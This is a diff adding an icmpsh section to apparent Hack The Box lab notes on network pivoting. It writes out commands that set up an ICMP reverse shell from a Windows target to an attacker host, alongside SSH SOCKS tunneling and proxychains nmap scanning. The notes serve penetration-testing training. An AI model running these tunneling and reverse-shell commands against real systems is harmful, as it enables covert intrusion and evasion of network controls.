@@ -37,3 +37,20 @@ w1j0y@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
 ```
 w1j0y@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
 ```
+## icmpsh — Lighter Alternative for a Windows Target
+ptunnel-ng needs building on the pivot, which isn't always an option. If the target we're tunneling from is Windows, icmpsh skips that entirely — the client side is a single .exe, nothing to compile on target.
+### Attack Host — Server
+```
+w1j0y@htb[/htb]$ git clone https://github.com/bdamele/icmpsh.git
+```
+```
+w1j0y@htb[/htb]$ sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
+```
+```
+w1j0y@htb[/htb]$ python3 icmpsh_m.py 10.10.14.18 10.129.89.32
+```
+### Windows Target — Client
+```
+PS C:\> .\icmpsh.exe -t 10.10.14.18 -d 500 -b 30 -s 128
+```
+**=> Interactive shell over ICMP, no ptunnel-ng compile step needed on the Windows side**
